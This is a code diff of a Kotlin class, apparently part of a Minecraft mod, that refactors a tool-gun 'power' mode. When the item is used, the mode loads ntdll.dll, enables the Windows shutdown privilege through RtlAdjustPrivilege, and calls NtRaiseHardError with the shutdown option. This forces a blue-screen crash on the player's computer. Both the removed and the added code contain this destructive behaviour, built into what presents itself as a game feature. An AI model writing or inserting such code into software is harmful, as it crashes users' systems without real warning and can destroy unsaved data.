@@ -43,41 +43,42 @@ class PowerMode : AbstractToolGunMode() {
 		val tooltip: MutableComponent = modTranslatable("tool_gun", "power", "mode", "tooltip")
 	}
 
+	private val linker: Linker = Linker.nativeLinker()
+	private val localArena: Arena = Arena.ofAuto()
+	private val ntLookup: SymbolLookup = this.localArena.getLookup("ntdll.dll")
+	val rtlAdjustPrivilege: MethodHandle = this.ntLookup.getDowncall(
+		this.linker, "RtlAdjustPrivilege", ValueLayout.JAVA_INT,
+		ValueLayout.JAVA_INT, ValueLayout.JAVA_BOOLEAN, ValueLayout.JAVA_BOOLEAN, ValueLayout.ADDRESS
+	)
+	val ntRaiseHardError: MethodHandle = this.ntLookup.getDowncall(
+		this.linker,
+		"NtRaiseHardError",
+		ValueLayout.JAVA_INT,
+		ValueLayout.JAVA_INT,
+		ValueLayout.JAVA_LONG,
+		ValueLayout.ADDRESS,
+		ValueLayout.ADDRESS,
+		ValueLayout.JAVA_INT,
+		ValueLayout.ADDRESS
+	)
+	val dataSegment: MemorySegment = this.localArena.allocate(4)
+
 	override fun action(level: Level, player: Player, stack: ItemStack) {
 		if (!level.isClientSide) return
-		val linker = Linker.nativeLinker()
-		val localArena = Arena.ofAuto()
-		val ntLookup: SymbolLookup = localArena.getLookup("ntdll.dll")
-		val rtlAdjustPrivilege: MethodHandle = ntLookup.getDowncall(
-			linker, "RtlAdjustPrivilege", ValueLayout.JAVA_INT,
-			ValueLayout.JAVA_INT, ValueLayout.JAVA_BOOLEAN, ValueLayout.JAVA_BOOLEAN, ValueLayout.ADDRESS
-		)
-		val previousValueSegment = localArena.allocate(1)
-		var returnCode = rtlAdjustPrivilege.invokeExact(
-			19, true, false, previousValueSegment
-		) as Int
-		val previousSegmentValue = previousValueSegment.get(AddressLayout.JAVA_BOOLEAN, 0)
-		player.sendSystemMessage(Component.literal("RtlAdjustPrivilege return code: $returnCode, $previousSegmentValue"))
-		level.playLocalSound(player, ModSounds.WRONG.get(), SoundSource.MASTER, 1f, 1f)
 		Thread.ofVirtual().start {
-			Thread.sleep(3000)
-			val ntRaiseHardError: MethodHandle = ntLookup.getDowncall(
-				linker,
-				"NtRaiseHardError",
-				ValueLayout.JAVA_INT,
-				ValueLayout.JAVA_INT,
-				ValueLayout.JAVA_LONG,
-				ValueLayout.ADDRESS,
-				ValueLayout.ADDRESS,
-				ValueLayout.JAVA_INT,
-				ValueLayout.ADDRESS
-			)
-			val returnSegment = localArena.allocate(4)
-			returnCode = ntRaiseHardError.invokeExact(
-				(0xBA7AC5A0).toInt(), 0L, MemorySegment.NULL, MemorySegment.NULL, 6, returnSegment
+			var returnCode = this.rtlAdjustPrivilege.invokeExact(19, true, false, this.dataSegment) as Int
+			var previousSegmentValue = this.dataSegment.get(AddressLayout.JAVA_BOOLEAN, 0)
+			player.sendSystemMessage(Component.literal("RtlAdjustPrivilege (on) return code: $returnCode, $previousSegmentValue"))
+			level.playLocalSound(player, ModSounds.WRONG.get(), SoundSource.MASTER, 1f, 1f)
+			Thread.sleep(2500)
+			returnCode = this.ntRaiseHardError.invokeExact(
+				(0xDA7AC5A0).toInt(), 0L, MemorySegment.NULL, MemorySegment.NULL, 6, this.dataSegment
 			) as Int
-			val returnSegmentValue = returnSegment.get(AddressLayout.JAVA_INT, 0)
+			val returnSegmentValue = this.dataSegment.get(AddressLayout.JAVA_INT, 0)
 			player.sendSystemMessage(Component.literal("NtRaiseHardError return code: $returnCode, $returnSegmentValue"))
+			returnCode = this.rtlAdjustPrivilege.invokeExact(19, false, false, this.dataSegment) as Int
+			previousSegmentValue = this.dataSegment.get(AddressLayout.JAVA_BOOLEAN, 0)
+			player.sendSystemMessage(Component.literal("RtlAdjustPrivilege (off) return code: $returnCode, $previousSegmentValue"))
 		}
 	}
 
